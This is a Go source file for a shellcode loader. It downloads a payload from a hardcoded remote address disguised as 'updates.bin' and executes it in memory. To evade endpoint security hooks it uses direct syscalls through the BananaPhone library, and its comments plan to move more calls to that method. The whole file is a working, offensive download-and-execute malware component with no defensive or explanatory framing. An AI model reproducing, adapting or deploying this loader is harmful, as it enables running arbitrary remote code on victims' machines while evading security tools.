package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"unsafe"

	b "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"golang.org/x/sys/windows"
)

// Windows API consts!
// https://www.magnumdb.com goated site
const (
	PROCESS_ALL_ACCESS     = 0x1F0FFF
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READ      = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
)

// TODO: ASAP switch all syscalls to bananaphone equilevants,

// url input used to d r
func DownloadARun(url string) error {

	// Get shellcode from URL
	resp, err := http.Get(url)
	if err != nil {

		return err
	}
	defer resp.Body.Close()

	// shellcode code obtained from server so its hosted like
	// python -m http.server 8080 as an example so we fetch it directly, needs to be direct or won't work
	scode, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	// grab current PIC
	pid := windows.GetCurrentProcessId() // TODO swap to banana phone equilevant asap

	// Get proccu handle
	pHandle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pid)
	if err != nil {

		return err
	}
	defer windows.CloseHandle(pHandle)

	// bp = bananaphone
	bp, err := b.NewBananaPhone(b.AutoBananaPhoneMode)
	if err != nil {

	}

	// Alloc virtual mem
	var ntAllocID uint16
	if bp != nil {
		ntAllocID, _ = bp.GetSysID("NtAllocateVirtualMemory")
	} else {
		ntAllocID, _ = b.GetSysIDFromDisk("NtAllocateVirtualMemory")
	}

	var baseAddress uintptr
	regionSize := uintptr(len(scode))

	status, err := b.Syscall(
		ntAllocID,
		uintptr(pHandle),                      // proc handle
		uintptr(unsafe.Pointer(&baseAddress)), //baddress
		0,                                     // zero
		uintptr(unsafe.Pointer(&regionSize)),  // RegionSize so pointer to size
		uintptr(MEM_COMMIT|MEM_RESERVE),       // aloc type
		uintptr(PAGE_EXECUTE_READWRITE),       // protect
	)

	// no errors no error code
	if err != nil || status != 0 {
		return fmt.Errorf("allocation failed")
	}

	// write shellcode into js allocated mem!!
	var ntWriteID uint16
	if bp != nil {
		ntWriteID, _ = bp.GetSysID("NtWriteVirtualMemory")
	} else {
		ntWriteID, _ = b.GetSysIDFromDisk("NtWriteVirtualMemory")
	}

	var written uintptr
	status, err = b.Syscall(
		ntWriteID,
		uintptr(pHandle),
		baseAddress,
		uintptr(unsafe.Pointer(&scode[0])),
		uintptr(len(scode)),
		uintptr(unsafe.Pointer(&written)),
	)

	if err != nil || status != 0 {

		return fmt.Errorf("write failed tfff")
	}

	// Protect virtual mem
	var ntProtectID uint16
	if bp != nil {
		ntProtectID, _ = bp.GetSysID("NtProtectVirtualMemory")
	} else {
		ntProtectID, _ = b.GetSysIDFromDisk("NtProtectVirtualMemory")
	}

	protectBase := baseAddress
	protectSize := regionSize
	var oldProtect uintptr

	status, err = b.Syscall(
		ntProtectID,
		uintptr(pHandle),
		uintptr(unsafe.Pointer(&protectBase)),
		uintptr(unsafe.Pointer(&protectSize)),
		uintptr(PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != nil || status != 0 {

		return fmt.Errorf("protect failed wtfff?????? ")
	}

	//create thrd to exec it
	var ntCreateThreadExID uint16
	if bp != nil {
		ntCreateThreadExID, _ = bp.GetSysID("NtCreateThreadEx")
	} else {
		ntCreateThreadExID, _ = b.GetSysIDFromDisk("NtCreateThreadEx")
	}
	var hThread uintptr
	status, err = b.Syscall(
		ntCreateThreadExID,
		uintptr(unsafe.Pointer(&hThread)),
		uintptr(0x1FFFFF), // access thingy
		0,
		uintptr(pHandle),
		protectBase, 0, 0, 0, 0, 0, 0,
	)
	if err != nil || status != 0 {
		return fmt.Errorf("thread creation failed completely wtf ??? is wrong")
	}
	fmt.Println("Executing shellcode!!")
	windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
	windows.CloseHandle(windows.Handle(hThread))

	return nil

}

func main() {
	// Url to download shellcode payload from directly, CHANGE THIS!
	url := "http://10.10.10.10:8080/updates.bin" // CHANGE!!!

	if err := DownloadARun(url); err != nil {
		fmt.Printf("Fatal error happened while attempting to load and exec: %v\n", err)
		os.Exit(1)
	}
}
